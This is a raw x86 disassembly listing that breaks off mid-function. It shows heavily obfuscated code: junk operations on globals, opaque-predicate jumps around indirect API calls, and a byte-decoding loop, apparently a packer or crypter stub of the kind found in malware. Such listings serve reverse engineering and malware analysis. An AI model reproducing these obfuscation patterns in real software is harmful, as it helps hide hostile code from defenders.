  41e0ee:	mov    esi,DWORD PTR [ebp-0x8]
  41e0f1:	sub    eax,0x3049
  41e0f6:	imul   eax,eax,0x585
  41e0fc:	add    eax,0x46ca
  41e101:	xor    ecx,0x3916a43d
  41e107:	div    esi
  41e109:	mov    edi,0x2a7c
  41e10e:	mov    esi,0x2cea
  41e113:	jmp    0x41e1aa
  41e118:	mov    DWORD PTR [ebp-0x20],0xeaf
  41e11f:	mov    DWORD PTR [ebp-0x14],0x6627
  41e126:	mov    DWORD PTR [ebp-0x18],0x2899
  41e12d:	mov    DWORD PTR [ebp-0x1c],0x4f7d
  41e134:	mov    eax,DWORD PTR [ebp-0x1c]
  41e137:	mov    edx,DWORD PTR [ebp-0x18]
  41e13a:	or     eax,edx
  41e13c:	mov    edx,DWORD PTR [ebp-0x14]
  41e13f:	imul   eax,edx
  41e142:	add    eax,DWORD PTR [ebp-0x20]
  41e145:	xor    edx,edx
  41e147:	mov    ebx,0x5ceb
  41e14c:	div    ebx
  41e14e:	mov    ebx,DWORD PTR [ebp+0x8]
  41e151:	mov    edx,ecx
  41e153:	xor    eax,0x4050
  41e158:	sub    edx,eax
  41e15a:	mov    DWORD PTR [ebp-0x20],edx
  41e15d:	mov    eax,DWORD PTR [ebp-0x24]
  41e160:	mov    dl,BYTE PTR [ebp+0xc]
  41e163:	xor    al,0xd1
  41e165:	sub    dl,al
  41e167:	mov    eax,DWORD PTR [ebp-0x28]
  41e16a:	sub    dl,al
  41e16c:	mov    eax,DWORD PTR [ebp-0x20]
  41e16f:	add    dl,0x52
  41e172:	mov    BYTE PTR [eax+ebx*1],dl
  41e175:	mov    eax,DWORD PTR [ebp-0x2c]
  41e178:	sub    eax,0x421
  41e17d:	and    eax,0xd30
  41e182:	add    eax,DWORD PTR [ebp-0x30]
  41e185:	xor    edx,edx
  41e187:	mov    ebx,0x6ea6
  41e18c:	div    ebx
  41e18e:	xor    edx,edx
  41e190:	add    ecx,eax
  41e192:	mov    eax,DWORD PTR [ebp-0x4]
  41e195:	mov    ebx,DWORD PTR [ebp-0x8]
  41e198:	sub    eax,0x3049
  41e19d:	imul   eax,eax,0x585
  41e1a3:	add    eax,0x46ca
  41e1a8:	div    ebx
  41e1aa:	mov    edx,DWORD PTR [ebp-0xc]
  41e1ad:	xor    eax,edx
  41e1af:	mov    edx,0x1086
  41e1b4:	sub    edx,eax
  41e1b6:	mov    eax,DWORD PTR [ebp-0x10]
  41e1b9:	and    eax,0x4a00
  41e1be:	or     eax,0x20
  41e1c1:	sub    eax,edi
  41e1c3:	xor    eax,esi
  41e1c5:	mov    ebx,ecx
  41e1c7:	sub    ebx,eax
  41e1c9:	cmp    ebx,edx
  41e1cb:	jbe    0x41e118
  41e1d1:	pop    edi
  41e1d2:	pop    esi
  41e1d3:	pop    ebx
  41e1d4:	leave  
  41e1d5:	ret    0x8
  41e1d8:	push   ebp
  41e1d9:	mov    ebp,esp
  41e1db:	and    esp,0xfffffff8
  41e1de:	sub    esp,0x8c
  41e1e4:	push   ebx
  41e1e5:	push   esi
  41e1e6:	push   edi
  41e1e7:	push   0xa
  41e1e9:	push   DWORD PTR ds:0x4220dc
  41e1ef:	push   DWORD PTR ds:0x4220dc
  41e1f5:	call   DWORD PTR ds:0x42a004
  41e1fb:	test   eax,eax
  41e1fd:	jle    0x41e20a
  41e203:	xor    eax,eax
  41e205:	jmp    0x41f82e
  41e20a:	mov    DWORD PTR [esp+0x38],0x10b8
  41e212:	or     DWORD PTR ds:0x4229b6,edx
  41e218:	mov    DWORD PTR [esp+0x3c],0x31bb
  41e220:	adc    ecx,ecx
  41e222:	mov    DWORD PTR [esp+0x40],0x2114
  41e22a:	mov    DWORD PTR [esp+0x44],0xfe7
  41e232:	cmp    DWORD PTR ds:0x4229c6,0x0
  41e239:	mov    ecx,DWORD PTR ds:0x422996
  41e23f:	not    ecx
  41e241:	jmp    0x41e2a4
  41e246:	mov    eax,0x3d56
  41e24b:	jb     0x41e288
  41e251:	push   0x4229ce
  41e256:	push   0x3b50
  41e25b:	push   0x1b8c
  41e260:	push   DWORD PTR [ebp-0x10]
  41e263:	push   DWORD PTR [ebp-0x14]
  41e266:	push   0x153f
  41e26b:	push   DWORD PTR [ebp-0x24]
  41e26e:	call   DWORD PTR ds:0x42a070
  41e274:	not    ecx
  41e276:	add    ecx,ecx
  41e278:	sbb    DWORD PTR ds:0x4228aa,0x4228c2
  41e282:	or     DWORD PTR ds:0x42298a,ebx
  41e288:	add    ecx,ecx
  41e28a:	sbb    DWORD PTR ds:0x42289e,0x422946
  41e294:	xor    ecx,ecx
  41e296:	xor    ecx,ecx
  41e298:	or     ecx,DWORD PTR ds:0x42292e
  41e29e:	add    DWORD PTR ds:0x4229b2,ecx
  41e2a4:	mov    DWORD PTR [esp+0x18],0xac404108
  41e2ac:	cmp    DWORD PTR ds:0x422922,0x0
  41e2b3:	mov    DWORD PTR ds:0x4229ce,0x2ada
  41e2bd:	mov    DWORD PTR ds:0x42297a,edi
  41e2c3:	jmp    0x41e324
  41e2c8:	not    DWORD PTR ds:0x42290a
  41e2ce:	mov    DWORD PTR ds:0x42288a,0x279a
  41e2d8:	jbe    0x41e30c
  41e2de:	push   0x4226b9
  41e2e3:	call   DWORD PTR ds:0x42a074
  41e2e9:	add    ecx,ecx
  41e2eb:	movzx  ecx,BYTE PTR ds:0x4229a6
  41e2f2:	and    DWORD PTR ds:0x42290e,ecx
  41e2f8:	and    DWORD PTR ds:0x42298e,edi
  41e2fe:	xor    ecx,ecx
  41e300:	xor    ecx,DWORD PTR ds:0x422932
  41e306:	or     DWORD PTR ds:0x422992,ecx
  41e30c:	add    ecx,DWORD PTR ds:0x4228aa
  41e312:	xor    ecx,0xa66
  41e318:	or     DWORD PTR ds:0x4228da,edi
  41e31e:	sub    eax,DWORD PTR ds:0x4229ba
  41e324:	mov    DWORD PTR [esp+0x1c],0x1002
  41e32c:	or     eax,eax
  41e32e:	mov    DWORD PTR [esp+0x10],0x9aa
  41e336:	xor    eax,eax
  41e338:	xor    eax,DWORD PTR ds:0x4229e2
  41e33e:	mov    ecx,DWORD PTR ds:0x422abe
  41e344:	sub    ecx,eax
  41e346:	and    eax,DWORD PTR [eax+ecx*1]
  41e349:	push   0x61f6
  41e34e:	cmp    DWORD PTR ds:0x4228ee,0x0
  41e355:	mov    DWORD PTR ds:0x42295e,0x401d
  41e35f:	mov    DWORD PTR ds:0x422972,ebx
  41e365:	mov    ecx,0x5ee5
  41e36a:	jmp    0x41e3d2
  41e36f:	mov    DWORD PTR ds:0x4228ae,ebx
  41e375:	mov    DWORD PTR ds:0x4228f2,0x622c
  41e37f:	ja     0x41e3b6
  41e385:	push   0x67cd
  41e38a:	push   DWORD PTR [ebp-0x24]
  41e38d:	push   0x11c0
  41e392:	call   DWORD PTR ds:0x42a078
  41e398:	sub    DWORD PTR ds:0x4228e2,0x2f74
  41e3a2:	xor    ecx,ecx
  41e3a4:	add    ecx,DWORD PTR ds:0x422922
  41e3aa:	xor    ecx,DWORD PTR ds:0x4228da
  41e3b0:	mov    DWORD PTR ds:0x422922,ecx
  41e3b6:	sub    ecx,0x1bd0
  41e3bc:	mov    ecx,DWORD PTR ds:0x422986
  41e3c2:	adc    DWORD PTR ds:0x42288e,ecx
  41e3c8:	or     DWORD PTR ds:0x42294a,0xc71
  41e3d2:	mov    DWORD PTR [esp+0x18],0x747
  41e3da:	mov    eax,DWORD PTR [esp+0x14]
  41e3de:	or     ecx,DWORD PTR ds:0x4228be
  41e3e4:	mov    ecx,DWORD PTR [esp+0x18]
  41e3e8:	push   0x1caf
  41e3ed:	sub    DWORD PTR ds:0x4228ae,0x2516
  41e3f7:	push   ecx
  41e3f8:	sub    DWORD PTR ds:0x422916,0x4228e6
  41e402:	push   eax
  41e403:	call   0x41dfb1
  41e408:	sbb    DWORD PTR ds:0x4228ce,0x6aff
  41e412:	mov    ecx,DWORD PTR [esp+0x18]
  41e416:	mov    esi,DWORD PTR ds:0x422946
  41e41c:	sub    DWORD PTR ds:0x4228be,esi
  41e422:	mov    esi,DWORD PTR [esp+0x1c]
  41e426:	sbb    DWORD PTR ds:0x4229d2,0x42291a
  41e430:	push   esi
  41e431:	sbb    DWORD PTR ds:0x42299a,0x3dc6
  41e43b:	push   ecx
  41e43c:	add    DWORD PTR ds:0x4228a2,0x422972
  41e446:	push   edx
  41e447:	push   eax
  41e448:	sbb    DWORD PTR ds:0x4228de,0x749b
  41e452:	call   0x421af6
  41e457:	mov    ecx,DWORD PTR [esp+0x40]
  41e45b:	sub    esi,DWORD PTR ds:0x42291a
  41e461:	mov    esi,DWORD PTR [esp+0x44]
  41e465:	sub    DWORD PTR ds:0x42288a,0x2899
  41e46f:	add    eax,ecx
  41e471:	mov    DWORD PTR ds:0x422956,0x3eb8
  41e47b:	mov    ecx,DWORD PTR [esp+0x38]
  41e47f:	adc    edx,esi
  41e481:	mov    esi,DWORD PTR [esp+0x3c]
  41e485:	sub    DWORD PTR ds:0x4228da,0x4228fa
  41e48f:	xor    eax,ecx
  41e491:	dec    DWORD PTR ds:0x4229c6
  41e497:	mov    DWORD PTR [esp+0x40],eax
  41e49b:	xor    edx,esi
  41e49d:	mov    DWORD PTR [esp+0x44],edx
  41e4a1:	or     DWORD PTR ds:0x42292e,ecx
  41e4a7:	mov    DWORD PTR [esp+0x18],0x6cd4
  41e4af:	mov    DWORD PTR [esp+0x1c],0x5497
  41e4b7:	mov    DWORD PTR [esp+0x10],0x36dd
  41e4bf:	xor    ecx,DWORD PTR ds:0x42289a
  41e4c5:	mov    DWORD PTR [esp+0x14],0x78dd
  41e4cd:	cmp    DWORD PTR ds:0x422956,0x0
  41e4d4:	mov    DWORD PTR ds:0x422902,0x537a
  41e4de:	mov    DWORD PTR ds:0x42289a,ebx
  41e4e4:	not    ecx
  41e4e6:	jmp    0x41e546
  41e4eb:	mov    DWORD PTR ds:0x4229aa,0x24bb
  41e4f5:	mov    ecx,0x50b
  41e4fa:	jle    0x41e530
  41e500:	push   0x40ba
  41e505:	push   0x4c3a
  41e50a:	push   DWORD PTR [ebp-0x20]
  41e50d:	push   0x19f6
  41e512:	push   DWORD PTR [ebp-0x28]
  41e515:	push   0x29a0
  41e51a:	call   DWORD PTR ds:0x42a2a8
  41e520:	adc    DWORD PTR ds:0x4228fe,0x2e50
  41e52a:	or     DWORD PTR ds:0x4229b2,edx
  41e530:	sub    DWORD PTR ds:0x422956,edi
  41e536:	add    DWORD PTR ds:0x422926,0x2a5
  41e540:	or     DWORD PTR ds:0x422916,ebx
  41e546:	mov    DWORD PTR [esp+0x38],0x3985
  41e54e:	cmp    DWORD PTR ds:0x4228d6,0x0
  41e555:	mov    DWORD PTR ds:0x4228c2,ecx
  41e55b:	mov    ecx,DWORD PTR ds:0x4228a2
  41e561:	jmp    0x41e5a8
  41e566:	not    eax
  41e568:	je     0x41e590
  41e56e:	push   DWORD PTR [ebp-0x10]
  41e571:	push   0x8599
  41e576:	push   DWORD PTR [ebp-0x24]
  41e579:	push   0x24de
  41e57e:	call   DWORD PTR ds:0x42a2ac
  41e584:	sub    DWORD PTR ds:0x4228fe,ebx
  41e58a:	and    ecx,0x2884
  41e590:	and    ecx,0x5007
  41e596:	sub    DWORD PTR ds:0x422892,edi
  41e59c:	adc    DWORD PTR ds:0x42295e,ebx
  41e5a2:	neg    DWORD PTR ds:0x42296e
  41e5a8:	push   0x0
  41e5aa:	not    eax
  41e5ac:	mov    DWORD PTR [esp+0x40],0x1dd2
  41e5b4:	movzx  ecx,WORD PTR ds:0x422892
  41e5bb:	and    ecx,DWORD PTR ds:0x4228e2
  41e5c1:	mov    DWORD PTR ds:0x422892,ecx
  41e5c7:	mov    eax,DWORD PTR [esp+0x3c]
  41e5cb:	or     DWORD PTR ds:0x42292a,ecx
  41e5d1:	mov    ecx,DWORD PTR [esp+0x40]
  41e5d5:	adc    DWORD PTR ds:0x4228a6,0x44d3
  41e5df:	push   0x5af1c38e
  41e5e4:	push   ecx
  41e5e5:	neg    DWORD PTR ds:0x4228a2
  41e5eb:	push   eax
  41e5ec:	not    DWORD PTR ds:0x4228e2
  41e5f2:	call   0x421af6
  41e5f7:	mov    ecx,DWORD PTR [esp+0x10]
  41e5fb:	movzx  esi,BYTE PTR ds:0x4228fe
  41e602:	add    esi,DWORD PTR ds:0x4229aa
  41e608:	mov    DWORD PTR ds:0x4228fe,esi
  41e60e:	mov    esi,DWORD PTR [esp+0x14]
  41e612:	sub    DWORD PTR ds:0x42293e,0x4228e6
  41e61c:	push   esi
  41e61d:	or     DWORD PTR ds:0x42290e,0x4229ba
  41e627:	push   ecx
  41e628:	adc    DWORD PTR ds:0x4229ce,0x4228a2
  41e632:	push   edx
  41e633:	add    DWORD PTR ds:0x422982,0x422926
  41e63d:	push   eax
  41e63e:	mov    DWORD PTR ds:0x422972,0x6150
  41e648:	call   0x41dfb1
  41e64d:	and    esi,DWORD PTR ds:0x4228e6
  41e653:	mov    ecx,DWORD PTR [esp+0x18]
  41e657:	cmp    DWORD PTR ds:0x4228d2,0x0
  41e65e:	mov    esi,0x2802
  41e663:	mov    esi,DWORD PTR ds:0x42290e
  41e669:	jmp    0x41e6e2
  41e66e:	mov    DWORD PTR ds:0x42292e,edx
  41e674:	mov    DWORD PTR ds:0x42298a,0x21bd
  41e67e:	ja     0x41e6cf
  41e684:	push   0x422835
  41e689:	push   DWORD PTR [ebp-0x24]
  41e68c:	push   DWORD PTR [ebp-0x28]
  41e68f:	push   0x295c
  41e694:	push   0x31b0
  41e699:	call   DWORD PTR ds:0x42a2b0
  41e69f:	or     DWORD PTR ds:0x422936,0x4228ba
  41e6a9:	movzx  esi,WORD PTR ds:0x42292a
  41e6b0:	add    esi,DWORD PTR ds:0x4229aa
  41e6b6:	mov    DWORD PTR ds:0x42292a,esi
  41e6bc:	movzx  esi,BYTE PTR ds:0x42290a
  41e6c3:	add    DWORD PTR ds:0x4229ba,esi
  41e6c9:	sub    DWORD PTR ds:0x422896,ecx
  41e6cf:	movzx  esi,BYTE PTR ds:0x4228ea
  41e6d6:	sub    DWORD PTR ds:0x4229be,esi
  41e6dc:	adc    DWORD PTR ds:0x42295a,ecx
  41e6e2:	mov    esi,DWORD PTR [esp+0x1c]
  41e6e6:	xor    eax,ecx
  41e6e8:	add    DWORD PTR ds:0x4228ce,ecx
  41e6ee:	mov    ecx,DWORD PTR [esp+0x40]
  41e6f2:	or     DWORD PTR ds:0x4229c2,0x4228c2
  41e6fc:	xor    edx,esi
  41e6fe:	xor    DWORD PTR ds:0x422946,ebx
  41e704:	mov    esi,DWORD PTR [esp+0x44]
  41e708:	sbb    DWORD PTR ds:0x4228d6,0x42295e
  41e712:	xor    eax,0x6e4d
  41e717:	adc    DWORD PTR ds:0x422966,0x4228c2
  41e721:	xor    edx,0x79dc
  41e727:	cmp    ecx,eax
  41e729:	jne    0x41ecec
  41e72f:	cmp    esi,edx
  41e731:	mov    DWORD PTR ds:0x422956,0x607f
  41e73b:	jne    0x41ecec
  41e741:	sbb    ecx,eax
  41e743:	mov    DWORD PTR [esp+0x40],0x7b6e
  41e74b:	and    DWORD PTR ds:0x422982,0x281d
  41e755:	mov    DWORD PTR [esp+0x18],0x1856
  41e75d:	dec    ecx
  41e75e:	mov    DWORD PTR [esp+0x10],0x6e3c
  41e766:	mov    eax,DWORD PTR [esp+0x10]
  41e76a:	inc    ecx
  41e76b:	imul   eax,eax,0x2801
  41e771:	mov    ecx,DWORD PTR ds:0x422a6a
  41e777:	mov    ecx,DWORD PTR [ecx]
  41e779:	and    DWORD PTR ds:0x422922,ecx
  41e77f:	xor    edx,edx
  41e781:	sbb    DWORD PTR ds:0x42289e,ebx
  41e787:	mov    ecx,0x5f48
  41e78c:	div    ecx
  41e78e:	push   DWORD PTR ds:0x3b8dcfc0
  41e794:	xor    edx,edx
  41e796:	adc    DWORD PTR ds:0x42290e,0x3f8e
  41e7a0:	and    eax,0x54fe
  41e7a5:	xor    eax,0x283cecf3
  41e7aa:	cmp    DWORD PTR ds:0x4228a2,0x0
  41e7b1:	mov    ecx,0x4c91
  41e7b6:	mov    DWORD PTR ds:0x422972,0x3523
  41e7c0:	mov    ecx,DWORD PTR ds:0x42288e
  41e7c6:	jmp    0x41e834
  41e7cb:	mov    DWORD PTR ds:0x4229c2,0x3b0c
  41e7d5:	mov    DWORD PTR ds:0x4228de,0x3b7b
  41e7df:	jbe    0x41e812
  41e7e5:	push   DWORD PTR [ebp-0x18]
  41e7e8:	push   0x2888
  41e7ed:	push   0x7bd5
  41e7f2:	push   0x6538
  41e7f7:	push   0x7c45
  41e7fc:	call   DWORD PTR ds:0x42a2b4
  41e802:	and    DWORD PTR ds:0x42295a,0x2f05
  41e80c:	xor    ecx,0x75ac
  41e812:	or     ecx,DWORD PTR ds:0x42288e
  41e818:	sbb    DWORD PTR ds:0x42298a,ebx
  41e81e:	mov    ecx,DWORD PTR ds:0x4228ba
  41e824:	sbb    DWORD PTR ds:0x422892,ecx
  41e82a:	sub    DWORD PTR ds:0x4229d2,0x2cc7
  41e834:	push   DWORD PTR [eax]
  41e836:	cmp    DWORD PTR ds:0x42288a,0x0
  41e83d:	mov    ecx,0x2a8f
  41e842:	mov    DWORD PTR ds:0x4228d2,0x62da
  41e84c:	mov    DWORD PTR ds:0x4228b2,0x461d
  41e856:	jmp    0x41e88e
  41e85b:	not    eax
  41e85d:	mov    eax,0x1aaa
  41e862:	jle    0x41e882
  41e868:	push   DWORD PTR [ebp-0x14]
  41e86b:	push   0x689c
  41e870:	call   DWORD PTR ds:0x42a2b8
  41e876:	and    ecx,DWORD PTR ds:0x4228ce
  41e87c:	add    DWORD PTR ds:0x4228c2,ecx
  41e882:	sbb    DWORD PTR ds:0x42299e,ecx
  41e888:	sbb    ecx,0xe30
  41e88e:	mov    eax,DWORD PTR [esp+0x20]
  41e892:	push   0xb
  41e894:	pop    ecx
  41e895:	div    ecx
  41e897:	sub    ecx,0x60ba
  41e89d:	mov    ecx,DWORD PTR [esp+0x48]
  41e8a1:	not    DWORD PTR ds:0x4228b6
  41e8a7:	sub    eax,ecx
  41e8a9:	adc    DWORD PTR ds:0x4229ca,0x4229b6
  41e8b3:	add    eax,0x4d1
  41e8b8:	sbb    DWORD PTR ds:0x422992,0x4228aa
  41e8c2:	imul   eax,eax,0xfffffb44
  41e8c8:	and    eax,0xd55
  41e8cd:	xor    eax,0xf6b6e30e
  41e8d2:	push   DWORD PTR [eax]
  41e8d4:	add    DWORD PTR ds:0x42293e,0x4401
  41e8de:	push   DWORD PTR ds:0x3747636f
  41e8e4:	push   DWORD PTR ds:0xc7c2f83b
  41e8ea:	or     DWORD PTR ds:0x422926,0x64ef
  41e8f4:	push   DWORD PTR ds:0xe8d8887e
  41e8fa:	push   DWORD PTR ds:0x1e049617
  41e900:	xor    DWORD PTR ds:0x4228b2,0x4229ae
  41e90a:	call   DWORD PTR ds:0x42a030
  41e910:	not    eax
  41e912:	mov    DWORD PTR [esp+0x18],0xac269
  41e91a:	cmp    DWORD PTR ds:0x422992,0x0
  41e921:	mov    ecx,DWORD PTR ds:0x4228d2
  41e927:	mov    ecx,0x4e69
  41e92c:	not    ecx
  41e92e:	jmp    0x41e97e
  41e933:	not    DWORD PTR ds:0x4228d2
  41e939:	mov    DWORD PTR ds:0x4228ee,0x6c90
  41e943:	jb     0x41e978
  41e949:	push   0x7f87
  41e94e:	push   DWORD PTR [ebp-0x1c]
  41e951:	push   0x186c
  41e956:	push   DWORD PTR [ebp-0x10]
  41e959:	push   DWORD PTR [ebp-0x1c]
  41e95c:	call   DWORD PTR ds:0x42a07c
  41e962:	adc    DWORD PTR ds:0x422962,0x439a
  41e96c:	sbb    ecx,ecx
  41e96e:	or     DWORD PTR ds:0x4229b6,0x7fc4
  41e978:	sbb    ecx,ecx
  41e97a:	add    ecx,ecx
  41e97c:	or     ecx,ecx
  41e97e:	mov    DWORD PTR [esp+0x10],0x5886
  41e986:	mov    ecx,DWORD PTR [esp+0x10]
  41e98a:	sub    DWORD PTR ds:0x4228e6,ebx
  41e990:	mov    eax,0x2f60
  41e995:	xor    DWORD PTR ds:0x4228be,0x78d1
  41e99f:	sub    eax,ecx
  41e9a1:	movzx  ecx,BYTE PTR ds:0x422952
  41e9a8:	sbb    ecx,DWORD PTR ds:0x4228a6
  41e9ae:	mov    DWORD PTR ds:0x422952,ecx
  41e9b4:	mov    ecx,DWORD PTR [esp+0x18]
  41e9b8:	xor    eax,0x4eb0
  41e9bd:	xor    DWORD PTR ds:0x42293a,0x31dd
  41e9c7:	xor    edx,edx
  41e9c9:	or     DWORD PTR ds:0x422952,0x422962
  41e9d3:	div    ecx
  41e9d5:	imul   eax,eax,0x79e
  41e9db:	inc    DWORD PTR ds:0x422956
  41e9e1:	xor    eax,0x7f8a
  41e9e6:	sbb    DWORD PTR ds:0x422906,0x77b7
  41e9f0:	push   DWORD PTR [eax+0x66d98445]
  41e9f6:	or     DWORD PTR ds:0x4228a6,0x1e7d
  41ea00:	push   DWORD PTR ds:0x4af06c36
  41ea06:	sbb    DWORD PTR ds:0x4228ae,0x4228be
  41ea10:	call   DWORD PTR ds:0x42a33c
  41ea16:	and    DWORD PTR ds:0x42294a,edi
  41ea1c:	mov    DWORD PTR [esp+0x10],0xd8e5515f
  41ea24:	cmp    DWORD PTR ds:0x4228ba,0x0
  41ea2b:	mov    ecx,0x55dc
  41ea30:	mov    DWORD PTR ds:0x42292a,0x378a
  41ea3a:	not    DWORD PTR ds:0x422892
  41ea40:	jmp    0x41eab5
  41ea45:	mov    DWORD PTR ds:0x4228fe,0x78ab
  41ea4f:	mov    DWORD PTR ds:0x4228ba,0x7a87
  41ea59:	jb     0x41ea87
  41ea5f:	push   DWORD PTR [ebp-0x10]
  41ea62:	push   0x211a
  41ea67:	push   DWORD PTR [ebp-0xc]
  41ea6a:	push   DWORD PTR [ebp-0x20]
  41ea6d:	call   DWORD PTR ds:0x42a080
  41ea73:	and    DWORD PTR ds:0x42295e,edx
  41ea79:	or     esi,ecx
  41ea7b:	or     esi,DWORD PTR ds:0x422906
  41ea81:	and    DWORD PTR ds:0x4229b6,edi
  41ea87:	adc    DWORD PTR ds:0x422956,0x422932
  41ea91:	xor    ecx,ecx
  41ea93:	xor    ecx,DWORD PTR ds:0x422a9e
  41ea99:	xor    esi,esi
  41ea9b:	xor    esi,DWORD PTR ds:0x422b16
  41eaa1:	sub    ecx,esi
  41eaa3:	add    ecx,DWORD PTR [ecx+esi*1]
  41eaa6:	sub    ecx,ecx
  41eaa8:	movzx  esi,WORD PTR ds:0x42290a
  41eaaf:	and    DWORD PTR ds:0x4228fe,esi
  41eab5:	mov    DWORD PTR [esp+0x14],0x0
  41eabd:	cmp    DWORD PTR ds:0x4228f2,0x0
  41eac4:	movzx  esi,BYTE PTR ds:0x4228fa
  41eacb:	not    esi
  41eacd:	mov    DWORD PTR ds:0x42290e,0x4dc8
  41ead7:	jmp    0x41eb40
  41eadc:	mov    esi,DWORD PTR ds:0x4228b2
  41eae2:	not    eax
  41eae4:	jg     0x41eb21
  41eaea:	push   0x0
  41eaec:	push   0x36d5
  41eaf1:	push   0x10b0
  41eaf6:	call   DWORD PTR ds:0x42a2bc
  41eafc:	and    edx,0x7f12
  41eb02:	dec    ecx
  41eb03:	mov    edx,DWORD PTR ds:0x42291a
  41eb09:	or     edx,DWORD PTR ds:0x4228a2
  41eb0f:	mov    DWORD PTR ds:0x42291a,edx
  41eb15:	mov    edx,DWORD PTR ds:0x4228e6
  41eb1b:	or     DWORD PTR ds:0x4228a6,edx
  41eb21:	mov    edx,DWORD PTR ds:0x42296e
  41eb27:	add    DWORD PTR ds:0x4229c6,edx
  41eb2d:	movzx  edx,WORD PTR ds:0x42296a
  41eb34:	and    edx,DWORD PTR ds:0x422892
  41eb3a:	mov    DWORD PTR ds:0x42296a,edx
  41eb40:	mov    DWORD PTR [esp+0x38],0x9f7
  41eb48:	cmp    DWORD PTR ds:0x42292e,0x0
  41eb4f:	mov    DWORD PTR ds:0x4228c6,0x484a
  41eb59:	mov    DWORD PTR ds:0x42289a,edi
  41eb5f:	mov    esi,DWORD PTR ds:0x4228ce
  41eb65:	mov    DWORD PTR ds:0x42298e,ebx
  41eb6b:	jmp    0x41ebd6
  41eb70:	mov    DWORD PTR ds:0x422962,edi
  41eb76:	mov    DWORD PTR ds:0x4228f2,ebx
  41eb7c:	jb     0x41ebab
  41eb82:	push   0x3714
  41eb87:	push   DWORD PTR [ebp-0x1c]
  41eb8a:	push   DWORD PTR [ebp-0x28]
  41eb8d:	push   0x3c2f
  41eb92:	call   DWORD PTR ds:0x42a2c0
  41eb98:	movzx  edx,BYTE PTR ds:0x422976
  41eb9f:	and    DWORD PTR ds:0x4228de,edx
  41eba5:	and    DWORD PTR ds:0x4228d2,ecx
  41ebab:	mov    ecx,DWORD PTR ds:0x422aba
  41ebb1:	mov    edx,DWORD PTR ds:0x422ac6
  41ebb7:	sub    edx,ecx
  41ebb9:	sub    ecx,DWORD PTR [ecx+edx*1]
  41ebbc:	adc    DWORD PTR ds:0x4228ea,ebx
  41ebc2:	xor    ecx,ecx
  41ebc4:	xor    ecx,DWORD PTR ds:0x422962
  41ebca:	adc    DWORD PTR ds:0x4228ba,ecx
  41ebd0:	xor    ecx,DWORD PTR ds:0x42297a
  41ebd6:	mov    DWORD PTR [esp+0x3c],0x141c
  41ebde:	add    esi,0x66a7
  41ebe4:	mov    eax,DWORD PTR [esp+0x38]
  41ebe8:	adc    DWORD PTR ds:0x4228d2,ecx
  41ebee:	mov    ecx,DWORD PTR [esp+0x3c]
  41ebf2:	mov    edx,DWORD PTR [esp+0x10]
  41ebf6:	adc    esi,0x6098
  41ebfc:	mov    esi,DWORD PTR [esp+0x14]
  41ec00:	neg    DWORD PTR ds:0x42292e
  41ec06:	push   esi
  41ec07:	sub    DWORD PTR ds:0x42296e,0x5044
  41ec11:	push   edx
  41ec12:	xor    ecx,0x4611
  41ec18:	xor    eax,0x43f8
  41ec1d:	push   ecx
  41ec1e:	push   eax
  41ec1f:	call   0x421af6
  41ec24:	add    DWORD PTR ds:0x42297e,0x76c7
  41ec2e:	add    eax,0x2c3
  41ec33:	mov    DWORD PTR [esp+0x48],eax
  41ec37:	adc    edx,0x3413
  41ec3d:	mov    DWORD PTR [esp+0x4c],edx
  41ec41:	adc    ebx,ebx
  41ec43:	mov    DWORD PTR [esp+0x48],0x53b7
  41ec4b:	mov    DWORD PTR [esp+0x4c],0x3d65
  41ec53:	cmp    DWORD PTR ds:0x422922,0x0
  41ec5a:	mov    ebx,DWORD PTR ds:0x4228ce
  41ec60:	mov    esi,0x4014
  41ec65:	jmp    0x41ecda
  41ec6a:	mov    DWORD PTR ds:0x42291a,ecx
  41ec70:	jle    0x41ecbd
  41ec76:	push   0x1943
  41ec7b:	push   DWORD PTR [ebp-0xc]
  41ec7e:	push   DWORD PTR [ebp-0x14]
  41ec81:	push   0x5e2e
  41ec86:	push   0x7771
  41ec8b:	push   0x1795
  41ec90:	push   DWORD PTR [ebp-0x24]
  41ec93:	push   0x7fcf
  41ec98:	push   DWORD PTR [ebp-0x10]
  41ec9b:	call   DWORD PTR ds:0x42a2c4
  41eca1:	and    DWORD PTR ds:0x4228f6,ebx
  41eca7:	xor    ebx,esi
  41eca9:	xor    ebx,ebx
  41ecab:	xor    ebx,DWORD PTR ds:0x42295a
  41ecb1:	or     ebx,DWORD PTR ds:0x4228d2
  41ecb7:	mov    DWORD PTR ds:0x42295a,ebx
  41ecbd:	xor    esi,0x902
  41ecc3:	dec    DWORD PTR ds:0x4228ca
  41ecc9:	mov    ebx,DWORD PTR ds:0x4229fa
  41eccf:	mov    esi,DWORD PTR ds:0x422a42
  41ecd5:	sub    ebx,esi
  41ecd7:	add    ebx,DWORD PTR [ebx+esi*1]
  41ecda:	mov    DWORD PTR [esp+0x48],0x3123
  41ece2:	adc    ebx,esi
  41ece4:	mov    DWORD PTR [esp+0x4c],0x4c23
  41ecec:	mov    DWORD PTR ds:0x4228b6,0x79fc
  41ecf6:	mov    ebx,0xba699573
  41ecfb:	xor    DWORD PTR ds:0x4229be,edi
  41ed01:	mov    DWORD PTR [esp+0x20],ebx
  41ed05:	xor    DWORD PTR ds:0x42295a,0x1cf0
  41ed0f:	mov    esi,0x9c0a89d8
  41ed14:	sbb    DWORD PTR ds:0x422896,0x240d
  41ed1e:	mov    DWORD PTR [esp+0x24],esi
  41ed22:	add    DWORD PTR ds:0x4228d2,0x7237
  41ed2c:	mov    DWORD PTR [esp+0x70],0xba699577
  41ed34:	and    DWORD PTR ds:0x4228ba,0x422966
  41ed3e:	mov    DWORD PTR [esp+0x74],esi
  41ed42:	call   0x41a715
  41ed47:	lea    eax,[esp+0x58]
  41ed4b:	xor    edx,edx
  41ed4d:	or     edx,DWORD PTR ds:0x422892
  41ed53:	sbb    DWORD PTR ds:0x4228de,edx
  41ed59:	mov    DWORD PTR [esp+0x10],eax
  41ed5d:	mov    edx,DWORD PTR ds:0x422a32
  41ed63:	mov    ecx,DWORD PTR ds:0x422a56
  41ed69:	sub    edx,ecx
  41ed6b:	and    edx,DWORD PTR [edx+ecx*1]
  41ed6e:	lea    eax,[esp+0x68]
  41ed72:	cmp    DWORD PTR ds:0x42292a,0x0
  41ed79:	mov    DWORD PTR ds:0x422992,0x1c86
  41ed83:	mov    ecx,0x3791
  41ed88:	jmp    0x41edea
  41ed8d:	mov    ecx,0x61d6
  41ed92:	mov    ecx,0xdc4
  41ed97:	jge    0x41edce
  41ed9d:	push   DWORD PTR [ebp-0x28]
  41eda0:	call   DWORD PTR ds:0x42a2c8
  41eda6:	and    DWORD PTR ds:0x4228fe,0x4228ea
